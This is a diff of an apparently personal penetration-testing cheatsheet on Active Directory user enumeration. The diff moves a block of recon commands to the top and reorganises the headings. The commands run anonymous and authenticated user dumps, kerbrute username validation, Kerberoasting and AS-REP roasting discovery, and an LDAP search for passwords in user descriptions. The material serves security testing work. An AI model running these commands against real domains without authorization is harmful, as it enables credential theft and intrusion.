@@ -35,7 +35,45 @@ linked:
 
 ## Cheatsheet
 
-### 🔍 User List Extraction
+### 1. Recon Rápido (Probes)
+
+#### Probes mínimos
+
+```bash
+DC="dc01.dom.local"
+
+# 1. Anonymous (test always)
+nxc smb $DC -u '' -p '' --users
+rpcclient -U "" $DC -N -c 'enumdomusers'
+impacket-lookupsid 'dom/'@DC 5000
+
+# 2. OSINT username generation
+python3 linkedin2username.py -c "Target Co" -u u -p p -n dom.local
+kerbrute userenum --dc $DC -d dom.local linkedin_users.txt -o valid.txt
+
+# 3. Authenticated dumps
+USER="user"; PASS="pass"
+nxc ldap $DC -u $USER -p $PASS --users > users.txt
+nxc ldap $DC -u $USER -p $PASS --asreproastable > asrep.txt
+nxc ldap $DC -u $USER -p $PASS --kerberoasting kerb.txt
+nxc ldap $DC -u $USER -p $PASS --admin-count > admins.txt
+nxc ldap $DC -u $USER -p $PASS --password-not-required > vuln.txt
+
+# 4. Description password leak
+ldapsearch -h $DC -D "dom\\$USER" -w $PASS -b "DC=dom,DC=local" \
+  "(&(objectCategory=user)(description=*pass*))" \
+  samAccountName description
+
+# 5. Stale privileged
+Get-ADUser -Filter {LastLogonDate -lt (Get-Date).AddDays(-180) -and AdminCount -eq 1} `
+  -Properties LastLogonDate
+```
+
+---
+
+### 2. Enumeración
+
+#### 🔍 User List Extraction
 
 ````tabs
 tab: **netexec / crackmapexec**
@@ -57,7 +95,7 @@ tab: **OSINT-Based Discovery**
 ![[AD - Users Enumeration - User List Extraction#^ad-userlist-osint]]
 ````
 
-### 🆔 User Attributes & UAC Flags
+#### 🆔 User Attributes & UAC Flags
 
 ````tabs
 tab: **Critical User Attributes**
@@ -79,7 +117,7 @@ tab: **Detection Patterns**
 ![[AD - Users Enumeration - User Attributes y UAC Flags#^ad-attrs-detection]]
 ````
 
-### 🎯 High-Value Users
+#### 🎯 High-Value Users
 
 ````tabs
 tab: **Privileged Group Members**
@@ -101,7 +139,7 @@ tab: **gMSA / MSA / dMSA**
 ![[AD - Users Enumeration - High-Value Users#^ad-hv-gmsa]]
 ````
 
-### 🔓 User Enumeration Anonymous
+#### 🔓 User Enumeration Anonymous
 
 ````tabs
 tab: **Null Session SAMR**
@@ -123,7 +161,7 @@ tab: **Common Naming Patterns**
 ![[AD - Users Enumeration - User Enumeration Anonymous#^ad-anon-patterns]]
 ````
 
-### 📋 Stale & Misconfigured Users
+#### 📋 Stale & Misconfigured Users
 
 ````tabs
 tab: **Stale Accounts**
@@ -145,7 +183,7 @@ tab: **Other Misconfig Patterns**
 ![[AD - Users Enumeration - Stale y Misconfigured Users#^ad-misc-others]]
 ````
 
-### 🛠️ Tooling
+#### 🛠️ Tooling
 
 ````tabs
 tab: **netexec (nxc)**
@@ -261,42 +299,6 @@ Foundation crítica para la mayoría de ataques AD: Kerberoasting (necesita SPN-
    c. Spray with common passwords → direct ATO
    d. ACL abuse paths → BloodHound chains
    e. Shadow Credentials add → impersonation
-```
-
----
-
-## Detección rápida
-
-### Probes mínimos
-
-```bash
-DC="dc01.dom.local"
-
-# 1. Anonymous (test always)
-nxc smb $DC -u '' -p '' --users
-rpcclient -U "" $DC -N -c 'enumdomusers'
-impacket-lookupsid 'dom/'@DC 5000
-
-# 2. OSINT username generation
-python3 linkedin2username.py -c "Target Co" -u u -p p -n dom.local
-kerbrute userenum --dc $DC -d dom.local linkedin_users.txt -o valid.txt
-
-# 3. Authenticated dumps
-USER="user"; PASS="pass"
-nxc ldap $DC -u $USER -p $PASS --users > users.txt
-nxc ldap $DC -u $USER -p $PASS --asreproastable > asrep.txt
-nxc ldap $DC -u $USER -p $PASS --kerberoasting kerb.txt
-nxc ldap $DC -u $USER -p $PASS --admin-count > admins.txt
-nxc ldap $DC -u $USER -p $PASS --password-not-required > vuln.txt
-
-# 4. Description password leak
-ldapsearch -h $DC -D "dom\\$USER" -w $PASS -b "DC=dom,DC=local" \
-  "(&(objectCategory=user)(description=*pass*))" \
-  samAccountName description
-
-# 5. Stale privileged
-Get-ADUser -Filter {LastLogonDate -lt (Get-Date).AddDays(-180) -and AdminCount -eq 1} `
-  -Properties LastLogonDate
 ```
 
 ---
